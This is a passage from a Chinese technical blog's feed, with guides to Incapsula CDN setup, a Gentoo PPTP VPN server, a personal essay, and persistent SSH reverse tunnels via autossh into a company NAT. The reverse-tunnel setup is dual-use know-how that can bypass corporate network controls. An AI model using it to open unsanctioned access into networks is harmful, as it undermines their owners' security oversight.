alt="Incapsula免费CDN服务申请使用及加速效果测评" title="Incapsula免费CDN服务申请使用及加速效果测评"></a></p><p>3、Incapsula还支持设置带www和不带www的域名跳转（利用这个功能，你不再需要在Htaccess中设置301跳转了）、是否显示推广广告、网站原DNS和CDN的DNS记录详情等，点击放大：</p><p><a href="http://www.aspku.com/yunying/jingyan/47681.html" target="_blank" rel="external"><img src="http://www.aspku.com/uploads/allimg/150128/1343225M6-8.gif" alt="Incapsula免费CDN服务申请使用及加速效果测评" title="Incapsula免费CDN服务申请使用及加速效果测评"></a></p><p>4、Incapsula有一个登录保护功能，这个功能对于那些有用户账号系统登录页面的网站来说，将可以有效地保护好账号的安全。</p><p><a href="http://www.aspku.com/yunying/jingyan/47681.html" target="_blank" rel="external"><img src="http://www.aspku.com/uploads/allimg/150128/1343226036-9.gif" alt="Incapsula免费CDN服务申请使用及加速效果测评" title="Incapsula免费CDN服务申请使用及加速效果测评"></a></p><p>5、添加你想要使用Incapsula登录保护的页面的URL，然后用户在访问这个页面时需要授权了。</p><p><a href="http://www.aspku.com/yunying/jingyan/47681.html" target="_blank" rel="external"><img src="http://www.aspku.com/uploads/allimg/150128/134322OK-10.gif" alt="Incapsula免费CDN服务申请使用及加速效果测评" title="Incapsula免费CDN服务申请使用及加速效果测评"></a></p><p>6、Incapsula还提供了CDN缓存模式可供选择：关闭、标准和进阶模式。</p><p><a href="http://www.aspku.com/yunying/jingyan/47681.html" target="_blank" rel="external"><img src="http://www.aspku.com/uploads/allimg/150128/13432225T-11.gif" alt="Incapsula免费CDN服务申请使用及加速效果测评" title="Incapsula免费CDN服务申请使用及加速效果测评"></a></p><p>7、Incapsula还会通过对JS、CSS、Html等静态文件压缩，以达到加快页面加载的速度，你可以有选择性地关闭它们。</p><p><a href="http://www.aspku.com/yunying/jingyan/47681.html" target="_blank" rel="external"><img src="http://www.aspku.com/uploads/allimg/150128/1343222357-12.gif" alt="Incapsula免费CDN服务申请使用及加速效果测评" title="Incapsula免费CDN服务申请使用及加速效果测评"></a></p><p>8、Incapsula还会有一些高级的CDN缓存设置，比如Http头的no-cache、Max-age、Last Modified等协议，你都可以在Incapsula中选择是否遵循。</p><p><a href="http://www.aspku.com/yunying/jingyan/47681.html" target="_blank" rel="external"><img src="http://www.aspku.com/uploads/allimg/150128/1343225952-13.gif" alt="Incapsula免费CDN服务申请使用及加速效果测评" title="Incapsula免费CDN服务申请使用及加速效果测评"></a></p><p><strong>三、Incapsula设置日本、香港CDN节点</strong></p><p>1、Incapsula的CDN节点分布在香港、东京、新加坡、阿姆斯特丹、伦敦、阿什本、san jose、洛杉矶、特拉维夫、阿什维尔等地区，其中香港、东京是我们国内连接速度最快的主机机房位置。</p><p><a href="http://www.aspku.com/yunying/jingyan/47681.html" target="_blank" rel="external"><img src="http://www.aspku.com/uploads/allimg/150128/1343225512-14.gif" alt="Incapsula免费CDN服务申请使用及加速效果测评" title="Incapsula免费CDN服务申请使用及加速效果测评"></a></p><p>2、一般来说我们会选择Incapsula香港或者日本的CDN节点作为我们网站的加速的CDN，而要做到这一点，我们只需要知道CDN的节点服务器IP就可以了。Incapsula所有的CDN节点IP地址可以在这里找到：<a href="http://bgp.he.net/AS19551#_prefixes" target="_blank" rel="external">http://bgp.he.net/AS19551#_prefixes</a></p><p><a href="http://www.aspku.com/yunying/jingyan/47681.html" target="_blank" rel="external"><img src="http://www.aspku.com/uploads/allimg/150128/1343225D1-15.gif" alt="Incapsula免费CDN服务申请使用及加速效果测评" title="Incapsula免费CDN服务申请使用及加速效果测评"></a></p><p>3、想要设置Incapsula日本、香港CDN节点，先要保证参考上面的方法操作，网站已经成功接入了Incapsula的CDN，然后再到你的域名DNS管理处，将原来的CNAME记录删除，把@和www等记录全部改为A记录，记录值是Incapsula的CDN节点的IP地址。</p><p><a href="http://www.aspku.com/yunying/jingyan/47681.html" target="_blank" rel="external"><img src="http://www.aspku.com/uploads/allimg/150128/1343222359-16.gif" alt="Incapsula免费CDN服务申请使用及加速效果测评" title="Incapsula免费CDN服务申请使用及加速效果测评"></a></p><p>4、由于Incapsula的CDN节点有非常多的IP地址，我们可以多设置几个A记录。等DNS生效后，我们就能看到自己的网站访问到的Incapsula CDN节点已经变成了日本或者香港了。</p><p><a href="http://www.aspku.com/yunying/jingyan/47681.html" target="_blank" rel="external"><img src="http://www.aspku.com/uploads/allimg/150128/1343221S2-17.gif" alt="Incapsula免费CDN服务申请使用及加速效果测评" title="Incapsula免费CDN服务申请使用及加速效果测评"></a></p><p><strong>四、Incapsula日本、香港、美国CDN加速效果比较</strong></p><p>1、默认的我们在Incapsula添加自己的网站加速时，系统分给我们的是美国的Incapsula CDN加速节点，通过站长工具测试发现Incapsula的美国CDN服务器在国内连接状态还算不错，比较少丢包，Ping值一般在270-300之间。</p><p><a href="http://www.aspku.com/yunying/jingyan/47681.html" target="_blank" rel="external"><img src="http://www.aspku.com/uploads/allimg/150128/1343225354-18.gif" alt="Incapsula免费CDN服务申请使用及加速效果测评" title="Incapsula免费CDN服务申请使用及加速效果测评"></a></p><p>2、Incapsula日本和香港的Ping情况差不多，丢包比较少，响应时间也差不多。</p><p><a href="http://www.aspku.com/yunying/jingyan/47681.html" target="_blank" rel="external"><img src="http://www.aspku.com/uploads/allimg/150128/1343224P7-19.gif" alt="Incapsula免费CDN服务申请使用及加速效果测评" title="Incapsula免费CDN服务申请使用及加速效果测评"></a></p><p>3、这是晚上测试Incapsula香港CDN节点的响应时间，平均在200左右。</p><p><a href="http://www.aspku.com/yunying/jingyan/47681.html" target="_blank" rel="external"><img src="http://www.aspku.com/uploads/allimg/150128/1343222421-20.gif" alt="Incapsula免费CDN服务申请使用及加速效果测评" title="Incapsula免费CDN服务申请使用及加速效果测评"></a></p><p>4、这是白天测试Incapsula香港CDN节点的响应时间，平均在170左右。</p><p><a href="http://www.aspku.com/yunying/jingyan/47681.html" target="_blank" rel="external"><img src="http://www.aspku.com/uploads/allimg/150128/1343221916-21.gif" alt="Incapsula免费CDN服务申请使用及加速效果测评" title="Incapsula免费CDN服务申请使用及加速效果测评"></a></p><p>5、Incapsula日本和香港的Ping测试结果显然不是很让满意，按照以往的经验日本和香港的Ping响应时间一般是在70以下。用路由追踪工具查看了一下国内连接Incapsula日本和香港的线路走势，电信用户是绕道日本后再到香港的。</p><p><a href="http://www.aspku.com/yunying/jingyan/47681.html" target="_blank" rel="external"><img src="http://www.aspku.com/uploads/allimg/150128/134322G24-22.gif" alt="Incapsula免费CDN服务申请使用及加速效果测评" title="Incapsula免费CDN服务申请使用及加速效果测评"></a></p><p>6、联通用户访问也是一样，先到日本，再到香港。</p><p><a href="http://www.aspku.com/yunying/jingyan/47681.html" target="_blank" rel="external"><img src="http://www.aspku.com/uploads/allimg/150128/1343225G0-23.gif" alt="Incapsula免费CDN服务申请使用及加速效果测评" title="Incapsula免费CDN服务申请使用及加速效果测评"></a></p><p><strong>五、Incapsula日本香港免费CDN使用小结</strong></p><p>1、Incapsula与Cloudflare比较起来，可以不用修改NS，采用CNAME记录的方式就可以接入到CDN，方便不少。Incapsula 每个节点一个ip，未使用anycast技术，因此方便了我们根据自己</p><p>的需要来设置CDN节点的IP地址。</p><p>2、不过，从测试的结果来看，Incapsula日本香港免费CDN节点国内并不是直连，基本上都是绕道到美国或者日本，所以也就看到了日本和香港的Incapsula CDN使用效果差不多，有些美国线路情况比较好的CDN节点速度也很快。</p>]]></content>
    
    <summary type="html">
    
      作为差不多和cloudflare一道被国内的站长们认识的Incapsula，其提供的免费CDN加速服务一直可以正常使用，且有多个CDN节点可供选择。而cloudflare提供的免费CDN服务虽然不错，但是不知道是不是因为国内用户用太多了还是其他什么原因，现
    
    </summary>
    
      <category term="NETWORK" scheme="http://demonelf.github.io/categories/NETWORK/"/>
    
    
  </entry>
  
  <entry>
    <title>Gentoo下利用pptpd搭建PPTP服务器 </title>
    <link href="http://demonelf.github.io/NETWORK/Gentoo%E4%B8%8B%E5%88%A9%E7%94%A8pptpd%E6%90%AD%E5%BB%BAPPTP%E6%9C%8D%E5%8A%A1%E5%99%A8%20.html"/>
    <id>http://demonelf.github.io/NETWORK/Gentoo下利用pptpd搭建PPTP服务器 .html</id>
    <published>2019-08-29T04:02:00.512Z</published>
    <updated>2019-08-29T04:00:00.693Z</updated>
    
    <content type="html"><![CDATA[<p>首先检查当前系统的linux kernel有没有支持ppp, netfilter, mppe和 netfilter的nat,如果没有，请先配置支持这些组建，编译更新内核，然后重启系统。这块不再详述，如果想知道详细情况，可以留言问我。<br>接着安装必要软件</p><blockquote><p>emerge ppp</p><p>emerge pptpd</p></blockquote><p>然后修改配置文件<br>先是pptpd的配置文件 /etc/pptpd.conf<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">ppp /usr/sbin/pppd</div><div class="line">option /etc/ppp/options.pptpd</div><div class="line">logwtmp</div><div class="line">localip 172.16.0.1</div><div class="line">remoteip 172.16.0.2-254</div></pre></td></tr></table></figure></p><p>接着是ppp的配置文件 /etc/ppp/options.pptpd<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ms-dns 8.8.8.8</div><div class="line">ms-dns 8.8.4.4</div></pre></td></tr></table></figure></p><p>最后是用户密码文件 /etc/ppp/chap-secret<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#name server secret ip</div><div class="line">test@test.com pptpd test *</div></pre></td></tr></table></figure></p><p>第一项是登录vpn时使用的用户名，第二项是vpn服务器名（pptpd，l2tpd，xl2tpd等，也可以用*号），第三项是密码，第四项是分配给客户端的ip，如果是＊号，vpn服务器则会从自己的配置文件中选择一个ip分配给客户端。 </p><p>开启系统的封包转发： </p><blockquote><p>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</p></blockquote><p>最后别忘了启动pptpd服务</p><blockquote><p>/etc/init.d/pptpd start </p></blockquote><p>gentoo下客户端示例</p><blockquote><p>pptp 192.168.2.12 user test@test.com password test</p></blockquote>]]></content>
    
    <summary type="html">
    
      首先检查当前系统的linux kernel有没有支持ppp, netfilter, mppe和
netfilter的nat,如果没有，请先配置支持这些组建，编译更新内核，然后重启系统。这块不再详述，如果想知道详细情况，可以留言问我。 接着安装必要软件 e
    
    </summary>
    
      <category term="NETWORK" scheme="http://demonelf.github.io/categories/NETWORK/"/>
    
    
  </entry>
  
  <entry>
    <title>自己选择的路</title>
    <link href="http://demonelf.github.io/LIVE/%E8%87%AA%E5%B7%B1%E9%80%89%E6%8B%A9%E7%9A%84%E8%B7%AF.html"/>
    <id>http://demonelf.github.io/LIVE/自己选择的路.html</id>
    <published>2017-11-27T02:01:25.000Z</published>
    <updated>2017-11-27T02:28:34.692Z</updated>
    
    <content type="html"><![CDATA[<p><img src="pinkun0.jpg" alt=""></p><p>​    现实有时就是这么无情，其实很多人不是看不清现实，只是没有勇气面对现实。我们能做的是尽量珍惜拥有，加快强化自己。当残酷到来时我们多少能从容面对。在这个由钢筋铸造的城市中，我们被磨炼的不是变的无情，而是拥有钢铁般的心，更加强大而已。在这么明显的环境中，你还非要认为无论你处于什么处境，所有人格是平等。是应该可怜你、还是同情你？</p><p>​    有空任性却没空努力的人，那真是可怜之人必有可恨之处。</p><p>​    理论先于实践是因为想最大程度避免错的路，少撞墙。撞了不能再撞！</p><p>​    </p><p>​    想想自己多大了，不提是否应有能力回报，但是否连自己的选择的都不能承担。</p><p>​    自己选的路，就算跪着也要走完，宁可笑着流泪，也不要哭着后悔。</p>]]></content>
    
    <summary type="html">
    
      ​
现实有时就是这么无情，其实很多人不是看不清现实，只是没有勇气面对现实。我们能做的是尽量珍惜拥有，加快强化自己。当残酷到来时我们多少能从容面对。在这个由钢筋铸造的城市中，我们被磨炼的不是变的无情，而是拥有钢铁般的心，更加强大而已。在这么明显的环境中，你还
    
    </summary>
    
      <category term="LIVE" scheme="http://demonelf.github.io/categories/LIVE/"/>
    
      <category term="LIVE" scheme="http://demonelf.github.io/categories/LIVE/LIVE/"/>
    
    
  </entry>
  
  <entry>
    <title>使用SSH反向隧道进行内网穿透</title>
    <link href="http://demonelf.github.io/SYSTEM/%E4%BD%BF%E7%94%A8SSH%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F.html"/>
    <id>http://demonelf.github.io/SYSTEM/使用SSH反向隧道进行内网穿透.html</id>
    <published>2017-11-14T01:35:32.000Z</published>
    <updated>2017-11-14T01:46:57.692Z</updated>
    
    <content type="html"><![CDATA[<p><strong>1，前提条件</strong></p><table><thead><tr><th>环境</th><th>系统类型</th><th>本地用户</th><th>SSH服务端口</th></tr></thead><tbody><tr><td>A机位于公司的NAT网络</td><td>安装在VMware里的Debian 8 64bit虚拟机</td><td>userA</td><td>22</td></tr><tr><td>B机是一台有公网IP的VPS</td><td>CentOS 6 64bit</td><td>userVPS</td><td>1022</td></tr><tr><td>C机位于家庭的NAT网络</td><td>Windows系统</td><td>–</td><td>–</td></tr></tbody></table><p>实现目的：使得位于家庭NAT网络内的C机，可以SSH访问位于公司NAT网络内的A机。</p><p><strong>2，原理分析</strong><br>这里先讲向SS反向隧道的原理，如果你对原理不感兴趣，可以跳过这一节。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh -p 22 -qngfNTR 6766:127.0.0.1:22 usera@VPS的IP  #回车以后没有反应是正常的,隧道已经建立</div></pre></td></tr></table></figure><p>命令解析：<br>从(位于本地NAT网络里的)<strong>本机</strong>访问<strong>VPS</strong>，建立一条SSH隧道（本机的随机端口到VPS的22端口）<br>同时建立了一条反向隧道，将<strong>VPS</strong>上的6766端口转发到<strong>本机</strong>的22端口。</p><p>然后，就可以从VPS的6766端口访问本地的22端口了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh -p 6766 userA@127.0.0.1  #从SSH访问位于NAT网络里的linux机器</div></pre></td></tr></table></figure><p>从SSH访问位于本地NAT网络里的linux机器，这里的userA当然是本地NAT网络里的linux机器用户啦。</p><p>这样做有一个问题，那就是，由本地建立的SSH连接是会超时关闭的，如果连接关闭，隧道无法维持，那么VPS就无法利用反向隧道访问本地NAT网络了，为此我们需要一种方案来提供一条稳定的SSH反向隧道，于是autossh就派上用场了；</p><p>另外有个问题是，如果本地的Linux系统重启，那么autossh建立的隧道仍然会失效。所以这里我们采取的做法是：<br>1，将本地Linux系统的public key发给VPS，建立信任机制，这样，本地Linux系统可以无需VPS的密码而建立一条SSH隧道；<br>2，将autossh写入系统服务，使之在开机时可以自动建立SSH隧道。</p><p>知道了原理以后，接下来开始实际的操作步骤。</p><p><strong>3，VPS(B机)的操作</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">vim /etc/ssh/sshd_config  #打开如下选项</div><div class="line">GatewayPorts yes</div><div class="line"> </div><div class="line">/etc/init.d/sshd reload</div></pre></td></tr></table></figure><p><strong>4，A机的操作</strong><br>前面说了，A机位于公司内部NAT网络内，是一台安装在VMware Workstation Player里的Debian 8 64bit虚拟机。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install autossh openssh-server</div></pre></td></tr></table></figure><p><strong>配置A机可以免密码登陆到VPS(B机)</strong><br>具体方法为将A机的公钥发给VPS(B机)，这样A机开机时就可以自动建立一条到VPS的SSH隧道</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">su - userA    #这步可省略,但需要确保以下命令是在A机上以userA用户的身份运行的</div><div class="line"> </div><div class="line">ssh-keygen -t rsa    #连续三次回车,即在本地生成了公钥和私钥,不要设置密码</div><div class="line">ssh-copy-id -p VPS的SSH端口 -i ~/.ssh/id_rsa.pub userVPS@VPS的IP</div><div class="line"> </div><div class="line">sudo touch /var/log/ssh_nat.log &amp;&amp; sudo chmod 777 /var/log/ssh_nat.log</div><div class="line"> </div><div class="line">sudo vim /lib/systemd/system/autossh.service  #将下例内容粘贴复制进去</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">[Unit]</div><div class="line">Description=Auto SSH Tunnel</div><div class="line">After=network-online.target</div><div class="line"> </div><div class="line">[Service]</div><div class="line">User=userA     #改掉这里A机的用户</div><div class="line">Type=simple</div><div class="line">ExecStart=/usr/bin/autossh -M 6777 -NR 8388:127.0.0.1:22 -i ~/.ssh/id_rsa userVPS@VPS的IP -p VPS的SSH端口 &gt;&gt; /var/log/ssh_nat.log 2&gt;&amp;1 &amp;</div><div class="line">ExecReload=/bin/kill -HUP $MAINPID</div><div class="line">KillMode=process</div><div class="line">Restart=always</div><div class="line"> </div><div class="line">[Install]</div><div class="line">WantedBy=multi-user.target</div><div class="line">WantedBy=graphical.target</div></pre></td></tr></table></figure><p>解释一下上面的autossh命令：<br>添加的一个-M 6777参数,负责通过6777端口监视连接状态,连接有问题时就会自动重连<br>去掉了一个-f参数,因为autossh本身就会在background运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">sudo chmod +x /lib/systemd/system/autossh.service    #给予可执行权限</div><div class="line">sudo systemctl enable autossh    #设置开机自启</div><div class="line">sudo systemctl start autossh     #现在就启动服务</div><div class="line">sudo systemctl status autossh  #查看状态,出现Active: active (running)表示正常运行</div></pre></td></tr></table></figure><p>也可以<strong>登陆到VPS（B机）</strong>上看看8388端口是否真的有程序在监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ netstat -antp | grep :8388</div><div class="line">tcp        0      0 0.0.0.0:8388       0.0.0.0:*                   LISTEN      20041/sshd</div><div class="line">tcp        0      0 :::8388            :::*                        LISTEN      20041/sshd</div></pre></td></tr></table></figure><p><strong>5，尝试远程登陆</strong><br>接下来，我们就可以在家里的电脑(C机)上登陆到位于公司NAT网络里的那台Debian8虚拟机(A机)。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh userA@VPS的IP -p 8388</div></pre></td></tr></table></figure><p>注意：这里的userA并不是VPS(B机)上的用户，而是Debian8虚拟机(A机)上的用户。</p><p>参考资料：<br><a href="http://arondight.me/2016/02/17/%E4%BD%BF%E7%94%A8SSH%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" target="_blank" rel="external">使用SSH反向隧道进行内网穿透</a><br><a href="http://www.cnblogs.com/eshizhan/archive/2012/07/16/2592902.html" target="_blank" rel="external">SSH反向连接及Autossh</a><br><a href="https://hobo.house/2016/06/20/fun-and-profit-with-reverse-ssh-tunnels-and-autossh/" target="_blank" rel="external">Fun and Profit with Reverse SSH Tunnels and AutoSSH</a></p><p>2016/10/29 由 <a href="https://www.zhukun.net/archives/author/admin" target="_blank" rel="external">bear</a> 发表在 <a href="https://www.zhukun.net/archives/category/linux-2" target="_blank" rel="external">Linux运维</a> 分类 | 标签: | 将 <a href="https://www.zhukun.net/archives/8130" target="_blank" rel="external">固定链接</a> 加入收藏夹</p>]]></content>
    
    <summary type="html">
    
      1，前提条件 环境系统类型本地用户SSH服务端口A机位于公司的NAT网络安装在VMware里的Debian 8
64bit虚拟机userA22B机是一台有公网IP的VPSCentOS 6 64bituserVPS1022C机位于家庭的NAT网络Windo
    
    </summary>
    
      <category term="SYSTEM" scheme="http://demonelf.github.io/categories/SYSTEM/"/>
    
      <category term="SYSTEM" scheme="http://demonelf.github.io/categories/SYSTEM/SYSTEM/"/>
    
    
  </entry>
  
</feed>
